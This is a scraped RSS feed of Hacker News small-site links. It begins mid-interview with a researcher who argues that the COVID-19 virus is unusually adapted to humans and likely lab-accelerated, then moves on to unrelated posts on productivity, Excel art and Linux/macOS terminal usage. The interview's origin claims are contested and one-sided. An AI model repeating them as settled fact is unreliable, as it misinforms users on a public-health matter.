difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.minervanett.no/corona/the-most-logical-explanation-is-that-it-comes-from-a-laboratory/361860">https://www.minervanett.no/corona/the-most-logical-explanation-is-that-it-comes-from-a-laboratory/361860</a></em></p>]]>
            </description>
            <link>https://www.minervanett.no/corona/the-most-logical-explanation-is-that-it-comes-from-a-laboratory/361860</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738545</guid>
            <pubDate>Sun, 05 Jul 2020 13:38:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New revamped version of the AnyMeal recipe management software]]>
            </title>
            <description>
<![CDATA[
Score 43 | Comments 29 (<a href="https://news.ycombinator.com/item?id=23738543">thread link</a>) | @wedesoft
<br/>
July 5, 2020 | https://www.wedesoft.de/software/2020/06/30/anymeal/ | <a href="https://web.archive.org/web/*/https://www.wedesoft.de/software/2020/06/30/anymeal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.wedesoft.de/software/2020/06/30/anymeal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738543</guid>
            <pubDate>Sun, 05 Jul 2020 13:37:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tatsuo Horiuchi is painting pictures on PC with MS EXCEL]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23738479">thread link</a>) | @donbox
<br/>
July 5, 2020 | http://pasokonga.com/index.htm | <a href="https://web.archive.org/web/*/http://pasokonga.com/index.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>順次パソコン画をUPしていきますのでよろしくお願いいたします<br>
When you want to see lager picture , click the  paintings listed hereunder.<br>
<b><span color="#ff0000" size="2">The pictures shown on this site are "ExcellArt"by TatsuoHoriuchi,<br>
which were drawn and painted with Excel suported on PC originaly,</span><span color="#ff0000" size="3"><br>
</span><span color="#ff0000" size="2">and were re-formatted(rasterized) into JPG for the data-compression.</span></b><br>
And w<span size="4">hen you wont to contact T.Horiuchi, please click mailto; </span><i><b><span size="4" color="#ff0000"><a href="mailto:cbl97790@pop06.odn.ne.jp">pasokongaka</a></span></b></i><br>
</p><div>
  <div>
    <p><b><span lang="EN-US">If you want such small size copy  as size:A3(42cm</span>＊<span lang="EN-US">29.7cm),it is possible to print on A3size paper and to ship.<o:p></o:p></span></b></p>
    <p><b><span lang="EN-US">and the price of this is JP\6500, and the cost of air parcel will be JP\3500.<o:p></o:p></span></b><b><span lang="EN-US"><o:p>&nbsp;</o:p></span></b></p>
    <p><span lang="EN-US">we will send the invoice by e-mail through PayPal system according to
    your information which picture you want to buy.<o:p></o:p></span><span color="#000000" size="4"><b>

<br>
    </b></span></p></div>
</div></div>]]>
            </description>
            <link>http://pasokonga.com/index.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738479</guid>
            <pubDate>Sun, 05 Jul 2020 13:27:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Top 3 Reasons Why Your Side-Projects Fail (As A Programmer)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738458">thread link</a>) | @yassinerajallah
<br/>
July 5, 2020 | https://devhypercharged.com/the-top-3-reasons-why-your-side-projects-fail-as-a-programmer/ | <a href="https://web.archive.org/web/*/https://devhypercharged.com/the-top-3-reasons-why-your-side-projects-fail-as-a-programmer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
			
<p>The road to creating the first successful startup / side-project is spiky. The reasons for you to fail are endless and the reasons to win are complex. How can you get your next big thing? And what is stopping you from achieving it as a software developer?</p>
<p>As a senior undergrad and aspiring entrepreneur, I created over 7 projects over the past 3 years. All of them miserably failed and lessons were learned the hard way. You don’t have to go through the same experience to learn the same lessons, here is the final summary of my 3 years journey</p>
<h2><strong>1 – Build and launch</strong></h2>
<p>This might sound trivial, but you actually need to launch. No, you don’t need the best looking product out there to be able to compete, and yes you can find people interested in your product specifically. The internet is an endless source of attention, wherever you go, there is at least 1 person that wished for a solution to a problem you are solving. If the problem you are solving isn’t a priority for the end consumer, you will know. Your project can only grow as much as you believe it can. You are the ship captain and you are the god of that little project, make it or kill it.</p>
<p>In my countless attempts to build a unicorn (jargon for a startup valued at at least $1B) I often never understood why my project was going to work or fail so I quit. Fun fact, soon after, people made it with the same exact idea. I often acted out of ambition, and needless to say, resilience is what gets you to success. The more you endure, the closer you get to where you want.</p>
<p>Before even launching your solution to a problem, think of what approach you are adopting:</p>
<p><strong>Product focused approach:&nbsp;</strong>Your sole purpose is the product, you forget about the market because you are sure the product solves the problem for some people out there. So you strive to make the best UI/UX product out there. The initial time investment makes the approach high-risk high-reward. Personally, I’m not a big fan, if you don’t know someone who can build an optimized and off the charts UI/UX product design, maybe you want to let this one approach down. You’d be better off with having an MVP (minimal viable product) a product with core features only.</p>
<p><strong>Market focused approach:</strong>&nbsp;This approach is the low-risk high-reward investment. You iterate crazy fast over multiple ideas and see what sticks. You can literally skip building a product, set up a landing page, and start talking to people. This approach is not easy either because it will require building your communication skills and learning how to ask questions. I recommend reading ‘The Mom Test’ for this purpose.</p>
<p>This approach is more secure since there is no upfront investment, and if you are building something not wanted, you’ll know it. You will for sure. On the other side, you are building a product with the community, so even though you are working on the project solo or duo, in practice you aren’t, since you get help as much as you talk to users.</p>
<h2><strong>2 – Build but listen</strong></h2>
<p>If you are building a high-end or low-end product, you want to keep talking to people. Think of it this way: You are sailing a ship at 1 in the morning, darkness is your refuge, and there is a storm. Your only way out is to look at the stars. But there are no stars! In this context, your users are your stars, no matter how much you shy away you’ll end up hurting yourself. No matter how confident you are building the right thing, you are putting your confidence into a reality check.</p>
<p>Some developers aren’t comfortable talking to people while others can: Fun fact, you still need to do it. And it’s only a matter of time until you realize that your end users are people like you because you are solving the problem for yourself, to begin with.</p>
<p>Main take away: build a rocket ship or a cookie, you still need to talk to users. Crazy how many people don’t do it and end up wasting 5 – 7 months of development (yup that’s me)</p>
<h2><strong>3 – Manage but learn</strong></h2>
<p>One of your duties as a software developer is switching hats – You didn’t sign up for this did you- One time you’ll act as the technical guru of the project and another you’ll need to make business decisions. Your project is a bottle in a sea, who will even notice it? Forget money, for the time being, no ads, no paid marketing. First, you need to build your ‘business’ skills: promote your product, look at analytics, draw correlations between features and retention, bootstrapping, etc.. You don’t need me to mention all of the problems because they are countless, and this is what’s exciting! You’ll find yourself forgetting your code and reading a huge stack of articles on how to promote your product.</p>
<p>Playing the business person is overwhelming, that’s why it is advised to have a cofounder. Finding one isn’t easy but doable. Sharing the tasks never exempts you from learning the business side of things but at least will lift off some pressure.</p>
<p>As a business person, you don’t want to be stiff, stubborn, or sensitive! If your decision is bad and someone told you, then guess what: you found a valuable member for the project. Not anyone dares to criticize a friend’s product, and the faster you acknowledge your mistakes, the faster you learn, the higher you climb toward your long-waited goal. Obviously, I’m not implying that you should always say you are wrong even if you don’t believe so.</p>
<p>Finally, read! Okay this is probably the best piece of information there is on this article. As cheesy as it might sound, reaaaaaaad!!!! It opens doors you never knew existed. In fact, you can play a game – what I did and had instantaneous results – curate 5 to 6 high detail articles about 1 niche topic. Read all of them and highlight what you find important. Guess what, you are now in the top 1% of your competitors in that specific niche.</p>
<p>If you found this article helpful share it with 1 person that you believe will learn from it, keep the flow of positivity and information going. Thank you sooooo much for reading this. Until the next time, bye 🙂</p>

			
			
</div></div>]]>
            </description>
            <link>https://devhypercharged.com/the-top-3-reasons-why-your-side-projects-fail-as-a-programmer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738458</guid>
            <pubDate>Sun, 05 Jul 2020 13:22:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remap Enter to Control in GNU/Linux (2020 Edition)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738344">thread link</a>) | @todsacerdoti
<br/>
July 5, 2020 | http://emacsredux.com/blog/2020/07/05/remap-enter-to-control-in-gnu-linux-2020-edition/ | <a href="https://web.archive.org/web/*/http://emacsredux.com/blog/2020/07/05/remap-enter-to-control-in-gnu-linux-2020-edition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><strong>Note:</strong> Check out my <a href="http://emacsredux.com/blog/2013/11/12/a-crazy-productivity-boost-remap-return-to-control/">original article from 2013</a> about the rationale behind this remapping.</p>

<p>Recently I’ve switched back from macOS to GNU/Linux, as my primary development
environment, and I found out that my <a href="http://emacsredux.com/blog/2016/01/30/remap-return-to-control-in-gnu-slash-linux/">old article</a> on remapping <code>Enter</code>
to <code>Control</code> was no longer the optimal way to achieve this (e.g. - <code>xcape</code>
operates at the X level, which means it doesn’t work with Wayland or without a
GUI). It took me a bit of digging, but eventually I found
<a href="https://gitlab.com/interception/linux/plugins/dual-function-keys">dual-function-keys</a>
(a plugin for the <a href="https://gitlab.com/interception/linux/tools">interception
framework</a>), which does exactly
what I needed and it does it splendidly.</p>

<p>Unfortunately, the tool is not packaged for most
GNU/Linux distros<sup id="fnref:1"><a href="#fn:1">1</a></sup>, but setting it up from source is not that complex. In this article
I’ll share instructions that are specific to Ubuntu, but they should be
easy to modify for other Linux distros.</p>

<p>Let’s kick it off by downloading and installing the <code>interception</code> framework and
<code>dual-function-keys</code>:</p>

<pre><code># install build deps
$ sudo apt install libudev-dev libyaml-cpp-dev libevdev-dev cmake
# create a folder where to clone the source code
$ mkdir src &amp;&amp; cd src
# clone the necessary code
$ git clone https://gitlab.com/interception/linux/tools
$ git clone https://gitlab.com/interception/linux/plugins/dual-function-keys
# build and install the interception framework
$ cd tools
$ mkdir build
$ cd build
$ cmake ..
$ make
$ sudo make install
$ cd ../..
# build the dual-function-keys plugin
$ cd dual-functions-keys
$ make &amp;&amp; sudo make install
</code></pre>

<p>That wasn’t so hard, right? Now we have to create a couple of configuration files and we’re ready for action. The first one is <code>.dual-function-keys.yaml</code> (normally placed in your home folder):</p>

<div><div><pre><code><span># /home/username/.dual-function-keys.yaml</span>
<span>TIMING</span><span>:</span>
  <span>TAP_MILLISEC</span><span>:</span> <span>200</span>
  <span>DOUBLE_TAP_MILLISEC</span><span>:</span> <span>150</span>

<span>MAPPINGS</span><span>:</span>
  <span>-</span> <span>KEY</span><span>:</span> <span>KEY_ENTER</span>
    <span>TAP</span><span>:</span> <span>KEY_ENTER</span>
    <span>HOLD</span><span>:</span> <span>KEY_RIGHTCTRL</span>
</code></pre></div></div>

<p>That’s the main config for <code>dual-function-keys</code>, where we’re specifying the duration of a tap and double tap and our remapping rules. In our case there’s a single rule - <code>Enter</code> acts as <code>Enter</code> on tap (when pressed briefly) and as (right) <code>Control</code> when held down longer.</p>

<p>Then we need to create <code>/etc/udevmon.yaml</code> (you’ll need <code>sudo</code> for this):</p>

<div><div><pre><code><span># /etc/udevmon.yaml</span>
<span>-</span> <span>JOB</span><span>:</span> <span>"</span><span>intercept</span><span> </span><span>-g</span><span> </span><span>$DEVNODE</span><span> </span><span>|</span><span> </span><span>dual-function-keys</span><span> </span><span>-c</span><span> </span><span>/home/bozhidar/.dual-function-keys.yaml</span><span> </span><span>|</span><span> </span><span>uinput</span><span> </span><span>-d</span><span> </span><span>$DEVNODE"</span>
  <span>DEVICE</span><span>:</span>
    <span>EVENTS</span><span>:</span>
      <span>EV_KEY</span><span>:</span> <span>[</span><span>KEY_ENTER</span><span>,</span> <span>KEY_RIGHTCTRL</span><span>]</span>
</code></pre></div></div>

<p><strong>Note:</strong> Update the path the <code>.dual-function-keys.yaml</code> accordingly.</p>

<p>Finally we need to create a <code>systemd</code> service definition file for <code>udevmon</code> and start the new service:</p>

<div><div><pre><code><span># /etc/systemd/system/udevmon.service</span>

<span>[</span><span>Unit</span><span>]</span>
<span>Description=udevmon</span>
<span>Wants=systemd-udev-settle.service</span>
<span>After=systemd-udev-settle.service</span>

<span>[</span><span>Service</span><span>]</span>
<span>ExecStart=/usr/bin/nice -n -20 /usr/local/bin/udevmon -c /etc/udevmon.yaml</span>

<span>[</span><span>Install</span><span>]</span>
<span>WantedBy=multi-user.target</span>
</code></pre></div></div>

<p>Now we simply have to enable the <code>udevmon</code> service our remapping will kick in:</p>

<pre><code>$ sudo systemctl enable --now udevmon
</code></pre>

<p>That’s all! Now you can start enjoying your beloved productivity boost!</p>

<p>You can achieve a lot more with <code>dual-function-keys</code>, so I’d advice you to explore the
tool further. Keep hacking!</p>

<h2 id="alternatives">Alternatives</h2>

<p>Another option I considered was <a href="https://github.com/mooz/xkeysnail">xkeysnail</a>, which
seemed a bit simpler to setup, as it’s written in Python, and even has an <a href="https://github.com/mooz/xkeysnail/blob/master/example/config.py">example config geared towards Emacs users</a>. You might want to check it out.</p>

<p>If someone’s using another approach to achieve the same result I’d love to hear about it!</p>



  </div>
  
  
</article>

      </div>
    </div></div>]]>
            </description>
            <link>http://emacsredux.com/blog/2020/07/05/remap-enter-to-control-in-gnu-linux-2020-edition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738344</guid>
            <pubDate>Sun, 05 Jul 2020 12:58:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Roam Research for Daily Productivity]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738309">thread link</a>) | @austinrileygray
<br/>
July 5, 2020 | https://www.austinrileygray.com/blog/roam-research-for-daily-productivity | <a href="https://web.archive.org/web/*/https://www.austinrileygray.com/blog/roam-research-for-daily-productivity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>The Daily Routine</h2><p>Since making the switch to Roam for my productivity tool, I’ve started to enjoy the ease and simplicity of using the tool. Once I allocated time to develop a system that works for me within the tool, it streamlined my morning routine even more so than my last system in Notion. The greatest difference between the two systems is that I no longer have to store my daily notes page in any sort of hierarchy. Roam automatically saves a track record of my Daily Notes to the database, and they’re always searchable by date. On top of that, it’s also great to create pages on the fly with the [[]] keyboard shortcut for brain dumping thoughts around different topics / people / projects / strategies that come up while working. These pages are automatically saved to the database and are always searchable by topic/keyword as well.&nbsp;</p><div><p>Here's a screenshot of how I've been starting my days using my new productivity system in Roam:&nbsp;</p></div><figure id="w-node-1f15fb71f55a-83977b8e"><p><img src="https://uploads-ssl.webflow.com/5e0949b376f1c6bbe8b688cf/5f01cba0c33c889141c3a884_1rg6YpfCcukznlGOo47tYT9kplx8MGgbfu_BsPwrUMPZi_LwR_Ry1BjMyFlnCpldvSn6Wg7ZdCchsuUNaIQ-SJNooEEJGmz2ucQIRs11Meek7Ku--W3F1crKMvswN4-NPb92-Hwr.png" alt=""></p></figure><p>As you can see, I've saved this “Daily Routine” template as a favorite in my sidebar so that I can easily access this routine each morning when I begin my workday. The first thing I do when getting to my desk is copy this structure into my "Daily Notes" page. If you're not familiar with Roam yet, the tool automatically creates a new page each day under "Daily Notes." I'll break down each section of my Daily Routine below.&nbsp;<br></p><h3>Ramp Up</h3><p>This section consists of some daily habits I like to complete each morning to get my mind right for the work day. I start with 10 mins of meditation, move into a super quick workout with some pushups and situps to spark some good endorphins, write out what I'm thankful for, and finish by defining the most important project that I need to focus on. This process takes roughly 15 mins from start to finish. Once I'm done, I move directly into my Productive Cycle.<br></p><h3>Productive Cycle</h3><div><p>I've been geeking out on Deep Work since finishing the book in Q1. Through months of testing and iterations, I’ve developed a system that allows me to move the needle on my projects in an undistracted setting. Within my "Productive Cycle," I aim for 3 separate "Power Hours." This allows focused space and time to move projects forward first thing in the morning. By doing this at the beginning of my workday, I can dedicate the remainder of the day to the "shallow work" such as answering emails, jumping on zoom calls, and customer support. When I'm ready to begin each Power Hour, I expand the bullet point within Roam and begin answering the questions I’ve pre-programmed in the template shown below:</p></div><figure id="w-node-a26275288014-83977b8e"><p><img src="https://uploads-ssl.webflow.com/5e0949b376f1c6bbe8b688cf/5f01cba0dc9b2d35c5563a4d_Xe5t7sLEYqrXeMbp1r5WRoEynfcdmg85zqSnhpdiOTVV5KtQMTLIFyjPEo0QCFW4sXtJqlTw7p4vyhj0SmoBtDJL52ogVt3IK8tss4e3yTTF5HdEDQjt8zq3JpAVvbjLeclT4vFN.png" alt=""></p></figure><h4>Power Hours</h4><p>By answering the questions that I've pre-programmed for each Power Hour, I'm able to get crystal clear on exactly what I'm working on for the next hour. I've done some research and have learned that the brain can optimally focus for a a maximum time blocks of 45-52 minutes before needing a break. Therefore, I aim for 45 minutes of focus on the defined activity. Setting an alarm for your finish time does something to the brain to cut out any distractions that would take away from completing the activity. Even though the timer aspect has a profound effect on staying focused, it’s inevitable that some activities naturally require a few minutes over the allocated time block to complete. By setting the timer for 45 minutes, I’ve allowed for 7 minutes of buffer should the activity require extra time. Ultimately, by defining a time period for my work, I’m naturally more inclined to stay focused on the activity at hand.<br></p><h4>Planning &amp; Reflecting</h4><p>The planning portion takes roughly 2-3 mins before starting the actual focused work, and the "Reflect" section takes another 2-3 mins on the back end. If my project goes over the 45 minutes and runs closer to 52 minutes, this puts me really close to the 60 minute mark for the total session length.&nbsp;<br></p><p>By reflecting at the end of each Power Hour before my break, I can quickly capture what I completed and/or what still needs to be done to complete the defined activity. If I completed the activity, I use this time to write down what activity I should work on during the next Power Hour.<br></p><h4>Breaks</h4><p>When I complete each Power Hour, I take a 10 minute break to refill my coffee/tea and water bottle, use the restroom, and take a quick walk outside to get some Vitamin D and quickly check my phone to make sure nothing urgent is being requested from me.&nbsp;<br></p><p>I’ve noticed that there are some mornings where I’m so in the zone that breaks seem like a nuisance. But, I’ve been working to stay diligent in giving my brain a quick rest in between Power Hours and it seems to be working so far. Not only do breaks physically give your brain a rest, they also create clear stopping and starting points for different activities. AND, on top of that, breaks are a good time to add in some more pushups and situps to keep the blood flow moving :)&nbsp;</p><h4>Schedule</h4><p>I've been starting my Productive Cycle by jumping into my first Power Hour at 7 am so I can be done no later than 11 am.&nbsp; I’m aiming for 3 Power Hour sessions per morning, so after I add in the 10 minute breaks, it puts me finishing somewhere around 10:30am. Inevitably, I often get pulled into a request that needs my attention during a break, so I’ve been allowing the 30 minute buffer zone between 10:30 and 11 to make up for any lost time.<br></p><p>If you're interested in joining me in these Productive Cycle sessions, I've opened up a virtual link for others to join me and some other Green Spaces members via zoom. Send me an email to <a href="mailto:austinrileygray@gmail.com">austinrileygray@gmail.com</a> and let me know that you're interested in joining the Productive Cycle and I'll send over a free link to join the next cycle via Zoom. I’ve noticed an even greater amount of accountability and focus when doing these cycles with other movtivated individuals.&nbsp;<br></p><h3>Journal</h3><p>This is where I brain dump during the day. If I have a thought, idea, or to-do, this is the section where I place them. Creating to-do's in Roam is easy... all I have to do is type "/ todo" and click enter and a to-do is automatically created. I follow each to-do with /"today" "/tomorrow" or "/date picker" depending on which day I plan to complete the activity. This is nice because the to-do will show up on whichever day I assign it to in the daily notes filter.&nbsp;<br></p><h3>Reflect</h3><p>This is arguably the most important section of my daily routine and often the most neglected. With that being stated, reflecting on the day helps tremendously with knowing what I should be working on for the next day. When I take the time to complete this section, I'm laser focused on what needs to be done the next morning when starting my workday.&nbsp;<br></p><p>When I don't reflect at the end of the day, I end up wasting precious productive morning time thinking about what I need to work on when I'm starting the next day.&nbsp;<br></p><p>Moral of the story is: <strong>MAKE TIME TO REFLECT.</strong> This is as much of a reminder to myself as anything. It literally takes 5 minutes or less and is arguably the most valuable 5 minutes of each day.&nbsp;<br></p><h2>Conclusion</h2><p>Since incorporating this system into my daily routine, I can say with confidence that I've been more productive with my projects than I've ever been in my whole life. Completing my Productive Cycle first thing in the morning allows me to get what I need to get done before I get pulled into the daily whirlwind. It's great because I can dedicate the rest of the day to shallow work and being reactive without feeling bad about it. And working deeply is FUN and ENJOYABLE. I’m able to get into a state of "flow" that is hard for me to find outside of snowboarding or mountain biking.&nbsp;<br></p></div></div>]]>
            </description>
            <link>https://www.austinrileygray.com/blog/roam-research-for-daily-productivity</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738309</guid>
            <pubDate>Sun, 05 Jul 2020 12:53:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solve problems more effectively by adopting a strategic mindset]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738231">thread link</a>) | @ChrisHardman29
<br/>
July 5, 2020 | https://www.sivv.io/article/5f01979d48951651ff15cb0b/Solve-problems-more-effectively-by-adopting-a-strategic-mindset | <a href="https://web.archive.org/web/*/https://www.sivv.io/article/5f01979d48951651ff15cb0b/Solve-problems-more-effectively-by-adopting-a-strategic-mindset">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sivv.io/article/5f01979d48951651ff15cb0b/Solve-problems-more-effectively-by-adopting-a-strategic-mindset</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738231</guid>
            <pubDate>Sun, 05 Jul 2020 12:38:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Terminal illness: useful tips for being productive in the terminal]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738202">thread link</a>) | @ingve
<br/>
July 5, 2020 | https://www.selbekk.io/blog/2020/07/useful-tips-for-being-productive-in-the-terminal/ | <a href="https://web.archive.org/web/*/https://www.selbekk.io/blog/2020/07/useful-tips-for-being-productive-in-the-terminal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Just a disclaimer - I'm no terminal professional. Yet, over the 7 last years, I've learned a few very nice-to-know techniques that you might not have heard of. There's no guarantee that you'll learn anything from this, but a pretty bit chunk of my readers might learn at least a thing or two.</p><blockquote>A little side note here - these commands are meant for OSX only. They might work on Linux or WLS, but I haven't tried them out.</blockquote><h2>Use the clipboard!</h2><p>Every once in a while, you have some data in the clipboard that you want to use somehow, or you want to copy the output of a command into the clipboard. Either way - it's very possible to do!</p><p>So there are two commands you need to know - <code>pbcopy</code> and <code>pbpaste</code>. You can use them together with the pipe operator <code>|</code> and the "to file" operator <code>&gt;</code> to do really cool stuff. Here's a few examples:</p><p>To paste whatever is in your clipboard into a new file - let's say ".env" - you can do this:</p><pre><code>$ pbpaste &gt; .env</code></pre><p>No more creating a new file, then opening it in vim or VSCode to paste and save - now you can just type a few characters and get the job done!</p><p>Similarly, if you want to copy a file to the clipboard, you use the pipe operator and <code>pbcopy</code>. This is how it looks:</p><pre><code>$ cat .env | pbcopy</code></pre><p><code>cat</code> echoes out the entire contents of a file (in this instance <code>.env</code>) and the pipe operator passes it as input to the <code>pbcopy</code> command. Voilá - now you can copy the content of entire files without opening them!</p><p>I use this all the time when I need to copy my ssh key and paste it into GitHub or BitBucket. </p><p>You don't have to limit yourself to files though - pbcopy is much more flexible than that. Whatever you pipe in can be placed on the clipboard - so if you want to copy the result of a program (let's say an encryption program or a password generator), you just pipe it on in.</p><h2>Doing more with <code>less</code></h2><p>I often use the tiny file reader program <code>less</code> to scan, search and read through files. It's really powerful if you know how to use it, but even if you're just using it for the first time, you can just use the arrow keys on your keyboard to scroll through files directly in the terminal.</p><p>Now, I use this mostly to read configuration files, and if I come across something I need to change, I've always had to close the file I was looking at, and open it in an editor like <code>vim</code>. </p><p>Luckily - you can just type <code>v</code>, and the default editor (typically <code>vim</code>) opens up, focused on the <em>same line you were at</em>. Once you close <code>vim</code> (provided you know how to close <code>vim</code>), you're placed back in the same spot as you were as well.</p><p>Also - you can go the start of the document with <code>g</code>, and to the end with <code>shift + g</code>. You can search for a phrase by tapping <code>/</code>, and typing out whatever you're looking for. Navigate through the occurrences by <code>n</code> (forward) and <code>N</code> (backwards). And there's a ton of other things you can do (which you can read about <a href="https://www.linode.com/docs/quick-answers/linux/how-to-use-less/">here</a>).</p><h2>Open files and folders with <code>open</code></h2><p>Often times, you stumble across a file you want want to open the file's default application. That might be a video, an audio clip or perhaps a CSV file. You could exit the flow you're in, of course, and use Finder to navigate to your file and double click it - but we can do better.</p><p>If you want to open any file, you can use the <code>open</code> command to get it done from the terminal:</p><pre><code>$ open videos/screen_recording.mp4
$ open package.json
$ open images/vacation.png</code></pre><p>I usually don't open a lot of files this way, but I do open folders! Just use <code>open</code> on any folder, and you'll get started right away!</p><pre><code>$ open ~/Documents
$ open . # opens the current folder</code></pre><h2>Some power characters!-</h2><p>There are two really nice characters to know when using the terminal, and those two are <code>-</code> and <code>!</code>. </p><p>The <code>-</code> character (dash, hyphen, whatever you call it) works well in two contexts. You can add it to the <code>cd</code> command to return to the previous directory you were in, and you can add it to <code>git checkout</code> to check out the previous branch you were on.</p><pre><code># Example of using cd -
~/Documents $ cd /usr/bin
/usr/bin $ cd -
~/Documents $

# Example of using git checkout -
(master) $ git checkout feature-branch
(feature-branch) $ git checkout -
(master) $</code></pre><p>The exclamation mark is also pretty neat - it lets you search the history of command you've done previously, or re-use the arguments to the last command you used.</p><pre><code>$ !cat
$ # shows you the last command you ran that started with cat

$ less a.txt b.txt
$ vim !* # opens a.txt and b.txt in vim

$ less a.txt b.txt
$ vim !$ # opens b.txt in vim</code></pre><p>It's a neat little trick that I know for some reason, but I never use. Perhaps you'll find some use for it though!</p><p>Much more usable, however is the double exclamation point! Especially in conjunction with the <code>sudo</code> command. If you've ever run a command and realized you had to run it as an administrator, you can simply do <code>sudo !!</code> and re-run it with sudo!</p><pre><code>$ chmod +x /usr/share/firmlinks
